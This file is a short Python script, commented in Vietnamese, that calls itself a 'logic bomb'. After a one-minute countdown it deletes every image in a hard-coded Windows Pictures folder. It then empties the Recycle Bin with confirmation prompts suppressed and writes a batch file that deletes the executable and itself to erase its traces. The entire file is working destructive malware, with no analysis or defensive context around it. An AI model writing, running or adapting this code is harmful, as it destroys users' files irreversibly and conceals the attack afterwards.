import os
import time
import ctypes
import sys

# ⚠️ Cảnh báo
print("⚠️ Logic bomb sẽ chạy sau 1 phút và xóa toàn bộ ảnh trong thư mục Pictures.")
print("⏳ Đang đếm ngược ...")
time.sleep(60)

# 🧹 Xóa toàn bộ ảnh trong thư mục Pictures
pictures_dir = r"C:\Users\Mrgoat\Pictures"

# Các đuôi ảnh phổ biến cần xóa
extensions = ['.jpg', '.jpeg', '.png', '.gif', '.jfif', '.bmp', '.webp']

deleted = []
try:
    for filename in os.listdir(pictures_dir):
        filepath = os.path.join(pictures_dir, filename)
        if os.path.isfile(filepath) and any(filename.lower().endswith(ext) for ext in extensions):
            os.remove(filepath)
            deleted.append(filename)
            print(f"✅ Đã xóa: {filename}")
except Exception as e:
    print(f"❌ Lỗi khi xóa file ảnh: {e}")

if not deleted:
    print("⚠️ Không có ảnh nào được xóa.")

# 🗑️ Xóa thùng rác (Recycle Bin)
try:
    ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000007)
    print("🧺 Thùng rác đã được dọn sạch.")
except Exception as e:
    print(f"❌ Không thể dọn thùng rác: {e}")

# 💣 Tự xóa chính file EXE
try:
    exe_path = sys.executable
    bat_script = """
@echo off
timeout /t 2 > nul
del "{exe}"
del "%~f0"
""".format(exe=exe_path)

    with open("autodelete.bat", "w") as f:
        f.write(bat_script)

    os.system("start autodelete.bat")
    print("🫥 EXE đã kích hoạt tự xóa.")
except Exception as e:
    print(f"❌ Không thể tự xóa EXE: {e}")

